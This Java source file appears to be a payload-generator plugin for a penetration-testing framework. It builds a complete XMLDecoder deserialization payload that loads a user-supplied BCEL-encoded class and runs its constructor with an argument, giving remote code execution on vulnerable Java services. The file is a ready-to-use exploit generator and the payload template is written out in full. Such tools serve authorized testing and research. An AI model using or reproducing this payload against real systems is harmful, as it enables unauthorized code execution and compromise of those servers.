package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class BCELWithArgPayloadGenerator implements IHelper {

    public String getHelperTabCaption() {
        return "bcel with arg";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg argBCEL = XMLDecoderPlugin.pluginHelper.createArg();
        argBCEL.setName("bcel_string");
        argBCEL.setType(IArg.ARG_TYPE_STRING);
        argBCEL.setDefaultValue("$$BCEL$$...");
        argBCEL.setDescription("bcel字符串");
        argBCEL.setRequired(true);
        args.add(argBCEL);

        IArg argArg = XMLDecoderPlugin.pluginHelper.createArg();
        argArg.setName("class_arg");
        argArg.setType(IArg.ARG_TYPE_STRING);
        argArg.setDefaultValue("calc");
        argArg.setDescription("构造函数参数");
        argArg.setRequired(true);
        args.add(argArg);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String bcel_string = (String)customArgs.get("bcel_string");
        String class_arg = (String)customArgs.get("class_arg");
        resultOutput.infoPrintln("代码执行时，参数通过Class(java.lang.String)构造函数传入");
        String payload = String.format("<java>\n" +
                "    <new class =\"com.sun.org.apache.bcel.internal.util.ClassLoader\">\n" +
                "        <void method=\"loadClass\">\n" +
                "            <string>%s</string>\n" +
                "            <void method=\"getConstructor\">\n" +
                "                <array class=\"java.lang.Class\" length=\"1\">\n" +
                "                    <void index=\"0\"><class><string>java.lang.String</string></class></void>\n" +
                "                </array>\n" +
                "                <void method=\"newInstance\">\n" +
                "                    <array class=\"java.lang.Object\" length=\"1\">\n" +
                "                        <void index=\"0\"><string>%s</string></void>\n" +
                "                    </array>\n" +
                "                </void>\n" +
                "            </void>\n" +
                "        </void>\n" +
                "    </new>\n" +
                "</java>",bcel_string,class_arg);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
